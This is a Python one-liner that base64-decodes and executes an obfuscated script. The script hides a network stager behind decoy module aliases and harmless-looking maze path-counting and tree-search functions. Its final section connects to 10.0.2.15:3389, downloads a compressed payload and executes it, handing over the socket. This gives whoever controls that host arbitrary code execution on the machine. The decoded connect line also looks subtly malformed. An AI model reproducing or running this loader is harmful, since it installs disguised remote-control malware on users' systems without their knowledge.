exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCBhcyBhYnNlZ2EKaW1wb3J0IHpsaWIgYXMgZ29vZ2xlCmltcG9ydCBiYXNlNjQgYXMgbWF0aDcwCmltcG9ydCBzdHJ1Y3QgYXMgZmlyZWV5ZQppbXBvcnQgdGltZSBhcyBjaXNjbwoKUiA9IDQKQyA9IDQKCiMgUmV0dXJucyBjb3VudCBvZiBwb3NzaWJsZSBwYXRocyBpbiBhCiMgbWF6ZVtSXVtDXSBmcm9tICgwLDApIHRvIChSLTEsQy0xKQpkZWYgY291bnRQYXRocyhtYXplKToKICAgICMgSWYgdGhlIGluaXRpYWwgY2VsbCBpcyBibG9ja2VkLAogICAgIyB0aGVyZSBpcyBubyB3YXkgb2YgbW92aW5nIGFueXdoZXJlCiAgICBpZiAobWF6ZVswXVswXSA9PSAtMSk6CiAgICAgICAgcmV0dXJuIDAKCiAgICAjIEluaXRpYWxpemluZyB0aGUgbGVmdG1vc3QgY29sdW1uCiAgICBmb3IgaSBpbiByYW5nZShSKToKICAgICAgICBpZiAobWF6ZVtpXVswXSA9PSAwKToKICAgICAgICAgICAgbWF6ZVtpXVswXSA9IDEKCiAgICAgICAgIyBJZiB3ZSBlbmNvdW50ZXIgYSBibG9ja2VkIGNlbGwgaW4KICAgICAgICAjIGxlZnRtb3N0IHJvdywgdGhlcmUgaXMgbm8gd2F5IG9mCiAgICAgICAgIyB2aXNpdGluZyBhbnkgY2VsbCBkaXJlY3RseSBiZWxvdyBpdC4KICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawoKICAgICMgU2ltaWxhcmx5IGluaXRpYWxpemUgdGhlIHRvcG1vc3Qgcm93CiAgICBmb3IgaSBpbiByYW5nZSgxLCBDLCAxKToKICAgICAgICBpZiAobWF6ZVswXVtpXSA9PSAwKToKICAgICAgICAgICAgbWF6ZVswXVtpXSA9IDEKCiAgICAgICAgIyBJZiB3ZSBlbmNvdW50ZXIgYSBibG9ja2VkIGNlbGwgaW4KICAgICAgICAjIGJvdHRvbW1vc3Qgcm93LCB0aGVyZSBpcyBubyB3YXkgb2YKICAgICAgICAjIHZpc2l0aW5nIGFueSBjZWxsIGRpcmVjdGx5IGJlbG93IGl0LgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCgogICAgIyBUaGUgb25seSBkaWZmZXJlbmNlIGlzIHRoYXQgaWYgYSBjZWxsIGlzIC0xLAogICAgIyBzaW1wbHkgaWdub3JlIGl0IGVsc2UgcmVjdXJzaXZlbHkgY29tcHV0ZQogICAgIyBjb3VudCB2YWx1ZSBtYXplW2ldW2pdCiAgICBmb3IgaSBpbiByYW5nZSgxLCBSLCAxKToKICAgICAgICBmb3IgaiBpbiByYW5nZSgxLCBDLCAxKToKCiAgICAgICAgICAgICMgSWYgYmxvY2thZ2UgaXMgZm91bmQsIGlnbm9yZSB0aGlzIGNlbGwKICAgICAgICAgICAgaWYgKG1hemVbaV1bal0gPT0gLTEpOgogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgSWYgd2UgY2FuIHJlYWNoIG1hemVbaV1bal0gZnJvbQogICAgICAgICAgICAjIG1hemVbaS0xXVtqXSB0aGVuIGluY3JlbWVudCBjb3VudC4KICAgICAgICAgICAgaWYgKG1hemVbaSAtIDFdW2pdID4gMCk6CiAgICAgICAgICAgICAgICBtYXplW2ldW2pdID0gKG1hemVbaV1bal0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXplW2kgLSAxXVtqXSkKCiAgICAgICAgICAgICMgSWYgd2UgY2FuIHJlYWNoIG1hemVbaV1bal0gZnJvbQogICAgICAgICAgICAjIG1hemVbaV1bai0xXSB0aGVuIGluY3JlbWVudCBjb3VudC4KICAgICAgICAgICAgaWYgKG1hemVbaV1baiAtIDFdID4gMCk6CiAgICAgICAgICAgICAgICBtYXplW2ldW2pdID0gKG1hemVbaV1bal0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXplW2ldW2ogLSAxXSkKCiAgICAjIElmIHRoZSBmaW5hbCBjZWxsIGlzIGJsb2NrZWQsCiAgICAjIG91dHB1dCAwLCBvdGhlcndpc2UgdGhlIGFuc3dlcgogICAgaWYgKG1hemVbUiAtIDFdW0MgLSAxXSA+IDApOgogICAgICAgIHJldHVybiBtYXplW1IgLSAxXVtDIC0gMV0KICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIDAKCgojIERyaXZlciBjb2RlCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYXplID0gW1swLCAwLCAwLCAwXSwKICAgICAgICAgICAgWzAsIC0xLCAwLCAwXSwKICAgICAgICAgICAgWy0xLCAwLCAwLCAwXSwKICAgICAgICAgICAgWzAsIDAsIDAsIDBdXQogICAgcHJpbnQoY291bnRQYXRocyhtYXplKSkKCgpkZWYgc2VhcmNoKGhlbGxvLCBrZXkpOgogICAgIyBCYXNlIENhc2VzOiAgaXMgbnVsbCBvciBrZXkgaXMgcHJlc2VudAogICAgaWYgaGVsbG8gaXMgTm9uZSBvciBoZWxsby52YWwgPT0ga2V5OgogICAgICAgIHJldHVybiBoZWxsbwoKICAgICMgS2V5IGlzIGdyZWF0ZXIKICAgIGlmIGhlbGxvLnZhbCA8IGtleToKICAgICAgICByZXR1cm4gc2VhcmNoKGhlbGxvLnJpZ2h0LCBrZXkpCgogICAgIyBLZXkgaXMgc21hbGxlcgogICAgcmV0dXJuIHNlYXJjaChoZWxsby5sZWZ0LCBrZXkpCgoKZm9yIGNvdW50ZXIgaW4gcmFuZ2UoOCk6CiAgICB0cnk6CiAgICAgICAgZG90aGVtYXRoID0gYWJzZWdhLnNvY2tldCgyLCBhYnNlZ2EuU09DS19TVFJFQU0pCiAgICAgICAgZG90aGVtYXRoLmNvbm5lY3QoKCcxMC4wLjIuMTUsIDMzODkpKQogICAgICAgIGJyZWFrCiAgICBleGNlcHQ6CiAgICAgICAgY2lzY28uc2xlZXAoNSkKCnBsdXMgPSBmaXJlZXllLnVucGFjaygnPkknLCBkb3RoZW1hdGgucmVjdig0KSlbMF0KbWludXMgPSBkb3RoZW1hdGgucmVjdihwbHVzKQp3aGlsZSBsZW4obWludXMpIDwgcGx1czoKICAgIG1pbnVzICs9IGRvdGhlbWF0aC5yZWN2KHBsdXMgLSBsZW4obWludXMpKQpleGVjKGdvb2dsZS5kZWNvbXByZXNzKG1hdGg3MC5iNjRkZWNvZGUobWludXMpKSwgeydzJzogZG90aGVtYXRofSk=')[0]))
